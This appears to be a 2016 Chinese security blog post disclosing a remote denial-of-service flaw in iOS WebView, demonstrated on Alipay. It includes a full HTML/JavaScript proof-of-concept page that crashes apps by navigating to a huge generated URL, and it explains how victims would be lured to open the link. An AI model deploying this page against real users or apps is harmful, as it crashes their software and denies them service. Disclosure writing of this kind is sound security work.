# 【技术分享】iOS WebView远程拒绝服务漏洞(含支付宝演示视频)

阅读量 **147845**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-11-16 11:20:04

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

****

****

**作者：**[ **mryu1**](http://bobao.360.cn/member/contribute?uid=2779928186)

**稿费：500RMB（不服你也来投稿啊！）**

****投稿方式：发送邮件至linwei#360.cn，或登陆 ** ** ** **[
**网页版**](http://bobao.360.cn/contribute/index)********** **在线投稿****

**概述**

* * *

近期分析一个iOS APP Crash时发现在应用内打开好友发送的URL链接时应用假死后直接挂掉。经排查确认是iOS
WebViews存在远程拒绝服务漏洞，攻击者可以利用这个漏洞使打开恶意网页的应用、iOS
Safari浏览器拒绝服务。这个漏洞的利用方法非常简单，攻击者可以轻易的使用该漏洞进行攻击。

**涉及设备：** iPhone、iPad、iTouch

**涉及系统：** iOS 8.4~10.1.1

**APP：** 支付宝 V9.9.6

  

**漏洞危害**

* * *

攻击者在调用WebViews的APP（微信、QQ、微博….）中发送恶意链接或使用其他方式诱导受害者点击链接来启动恶意页面。一旦这个页面打开你会发现页面内容加载出来后，无论你怎么点击页面，APP或Safari浏览器都没有反应，数秒后直接崩溃掉。

下面是Remote DOS APP POC，Safari浏览器的POC暂不放出。

**Remote DOS APP POC:**

    
    
    <html>
    <head>
    <title>DOS POC</title>
    </head>
    <body>
    <h1>Start Attack - By MrYu.</h1>
    <script>
    y = "asddfg";
    for (i = 0; i < 10000000; i++) {
    y = y + "189768765409685743";
    }
    function attack() {
    window.location.href = y;
    }
    setTimeout("attack()", 1100);
    </script>
    </body>
    </html>

在恶意html页面内嵌入JavaScript代码，看代码可知程序生成了非常长的数字并把这些数字拼接到了url中，iOS
WebView在处理庞大字节URL链接出现异常导致APP崩溃。

  

**演示视频**

* * *

**总结**

* * *

受影响的不仅仅是支付宝，很多厂商SRC遇到这样的DOS漏洞通常会以“系统问题”为由而拒收。本文仅仅是把问题抛出来，漏洞影响和是否值得修复，大家可以酌情处理。

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **mryu1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84918](/post/id/84918)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) mryu1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

